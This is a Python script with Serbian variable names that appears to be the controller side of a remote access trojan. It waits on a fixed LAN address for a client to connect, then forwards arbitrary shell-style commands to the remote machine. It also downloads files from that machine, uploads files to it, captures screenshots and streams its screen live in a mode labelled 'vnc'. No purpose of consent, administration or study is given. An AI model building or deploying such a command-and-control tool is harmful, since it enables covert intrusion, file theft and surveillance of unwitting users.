import socket,os,threading

HOST = '192.168.0.12'
PORT = 65432
buffer=1024
vnc_status=False
vnc_port=3333

konekcija_vnc=None
adresa_vnc=None

def posalji_poruku(poruka):#provereno
    konekcija.send(str(len(poruka)).encode("utf-8"))
    konekcija.send(str(poruka).encode("utf-8"))

def primi_poruku():#provereno
    duzina=int(konekcija.recv(buffer).decode("utf-8"))
    poruka=konekcija.recv(duzina).decode("utf-8")
    return poruka

def download():#provereno
    ime_fajla=input("ime fajla za skidanje")
    posalji_poruku("download")
    a=primi_poruku()
    posalji_poruku(ime_fajla)
    postoji=primi_poruku()
    if postoji=="postoji":
        posalji_poruku('0')
        odgovor=primi_poruku()
        if odgovor=="moze":
            posalji_poruku('0')
            duzina = int(primi_poruku())
            posalji_poruku('1')
            bajtovi = konekcija.recv(duzina)
            while len(bajtovi) < duzina:
                bajtovi += konekcija.recv(duzina - len(bajtovi))
            try:
                f = open(ime_fajla, 'wb')
                f.write(bajtovi)
                f.close()
                print("fajl preuzet")
            except Exception as e:
                print(str(e))
        else:
            print("nije moguce preuzeti fajl")
    else:
        print("fajl nije pronadjen")

def konektuj():#provereno
    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.bind((HOST, PORT))
    serv.listen(5)
    print("ceka se konekcija")
    conn, addr = serv.accept()
    print("konekcija od: "+str(conn)+" "+str(addr))
    return conn,addr

def screenshot():#provereno
    posalji_poruku("screenshot")
    odg=primi_poruku()
    posalji_poruku('0')
    if odg=="moze":
        duzina = int(primi_poruku())
        posalji_poruku('0')
        bajtovi = konekcija.recv(duzina)
        while len(bajtovi) < duzina:
            bajtovi += konekcija.recv(duzina - len(bajtovi))
        f = open("screenshot.png", 'wb')
        f.write(bajtovi)
        f.close()
        os.system("start screenshot.png")
    else:
        print(odg)

def upload():#provereno
    ime_fajla=input("ime fajla za upload: ")
    if os.path.exists(ime_fajla):
        try:
            f=open(ime_fajla,'rb')
            bin=f.read()
            f.close()
            bajtovi = bytes(bin)
            duzina=len(bajtovi)
            print(str(duzina))
            posalji_poruku("upload")
            a=primi_poruku()
            posalji_poruku(ime_fajla)
            a=primi_poruku()
            posalji_poruku(str(duzina))
            a=primi_poruku()
            konekcija.send(bajtovi)
        except Exception as e:
            print(str(e))
        print(primi_poruku())
    else:
        print("fajl "+ime_fajla+" nije pronadjen")

def posalji_poruku_vnc(poruka,konekcija_vnc):
    konekcija_vnc.send(str(len(poruka)).encode("utf-8"))
    konekcija_vnc.send(str(poruka).encode("utf-8"))
def primi_poruku_vnc(konekcija_vnc):
    duzina = int(konekcija_vnc.recv(buffer).decode("utf-8"))
    poruka = konekcija_vnc.recv(duzina).decode("utf-8")
    return poruka

def konektuj_vnc():
    globals()
    serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv.bind((HOST, vnc_port))
    serv.listen(5)
    konekcija_vnc, adresa_vnc = serv.accept()
    #return konekcija_vnc, adresa_vnc
    vnc(konekcija_vnc)

def vnc(konekcija_vnc):
    while vnc_status:
        odg = primi_poruku_vnc(konekcija_vnc)
        if odg == "ok":
            posalji_poruku_vnc('0',konekcija_vnc)
            duzina = int(primi_poruku_vnc(konekcija_vnc))

            posalji_poruku_vnc('0',konekcija_vnc)
            bajtovi = konekcija_vnc.recv(duzina)
            #if len(bajtovi) < duzina:
                #bajtovi += konekcija_vnc.recv(duzina - len(bajtovi))
            while len(bajtovi) < duzina:
                bajtovi += konekcija_vnc.recv(duzina - len(bajtovi))
            posalji_poruku_vnc('0',konekcija_vnc)
            try:
                f = open("screenshot.png", 'wb')
                f.write(bajtovi)
                f.close()
            except Exception as e:
                f = open("vncLog.txt", 'a')
                f.write(str(e))
                f.close()
    konekcija_vnc.close()

x=konektuj()
konekcija=x[0]
addr=x[1]

while True:
    komanda=input("> ")
    if komanda=="upload":
        upload()
    elif komanda=="download":
        download()
    elif komanda=="screenshot":
        screenshot()
    elif komanda=="vnc":
        posalji_poruku("vnc")
        vnc_status=True
        thread = threading.Thread(target=konektuj_vnc, args=())
        thread.start()
        os.startfile("screenshot.png")
    elif komanda=="vnc_stop":
        vnc_status=False
    else:
        posalji_poruku(komanda)
        if komanda=="zatvori":
            exit(0)
        odgovor=primi_poruku()
        print(odgovor)